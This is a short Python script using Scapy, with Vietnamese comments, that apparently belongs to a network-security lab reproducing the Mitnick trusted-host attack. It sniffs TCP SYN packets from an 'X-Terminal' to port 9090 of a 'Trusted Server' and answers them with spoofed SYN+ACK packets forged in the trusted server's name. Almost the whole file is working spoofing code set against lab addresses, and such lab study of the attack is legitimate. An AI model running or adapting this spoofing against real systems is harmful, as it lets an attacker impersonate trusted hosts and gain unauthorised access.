#!/usr/bin/python3
from scapy.all import *

x_ip = "10.9.0.5"
srv_ip = "10.9.0.6"

srv_port = 9090
my_seq = 0x2000

iface_name = "br-8794a46d7e29"   # thay bằng interface thật

def spoof(pkt):
    if IP not in pkt or TCP not in pkt:
        return

    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    print("{}:{} -> {}:{} Flags={}".format(
        old_ip.src,
        old_tcp.sport,
        old_ip.dst,
        old_tcp.dport,
        old_tcp.flags
    ))

    # X-Terminal gửi SYN đến port 9090 của Trusted Server giả
    if old_ip.src == x_ip and old_ip.dst == srv_ip:
        if old_tcp.dport == srv_port and old_tcp.flags == "S":
            print("[+] Got SYN for second connection")

            ip = IP(src=srv_ip, dst=x_ip)
            tcp = TCP(
                sport=srv_port,
                dport=old_tcp.sport,
                flags="SA",
                seq=my_seq,
                ack=old_tcp.seq + 1
            )

            send(ip/tcp, verbose=0)
            print("[+] Sent spoofed SYN+ACK for second connection")

my_filter = "tcp and src host 10.9.0.5 and dst host 10.9.0.6 and dst port 9090"
sniff(iface=iface_name, filter=my_filter, prn=spoof)